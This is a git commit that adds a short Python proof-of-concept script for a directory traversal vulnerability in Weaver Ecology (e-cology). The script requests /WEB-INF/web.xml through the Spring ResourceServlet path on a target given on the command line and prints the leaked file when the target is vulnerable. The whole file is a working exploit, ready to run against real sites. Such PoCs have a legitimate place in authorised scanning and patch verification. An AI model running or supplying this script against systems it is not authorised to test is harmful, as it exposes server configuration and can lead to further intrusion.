e1104c6fad7d3abc27fbae66c95e5ccfb46da759
myh0st <1293348082@qq.com>
2023-11-15 15:24:55 +0800

    Create poc-yaml-ecology-springframework-directory-traversal.py

---
+++ poc-yaml-ecology-springframework-directory-traversal.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python3
+#-*- coding: utf-8 -*-
+#author: myh0st@xazlsec
+
+
+import requests
+import urllib3
+import sys
+import json
+import re
+
+def verify(site):
+    burp0_url = site + "/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml"
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept-Encoding": "gzip"}
+    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
+    if "<web-app>" in r.text:
+        return r.text
+    return ""
+
+if __name__=="__main__":
+    target = sys.argv[1]
+    info = verify(target)
+    if info != "":
+        print("[+]漏洞存在，读取 web.xml 的文件内容为：", info)
+    else:
+        print("[-]漏洞不存在")
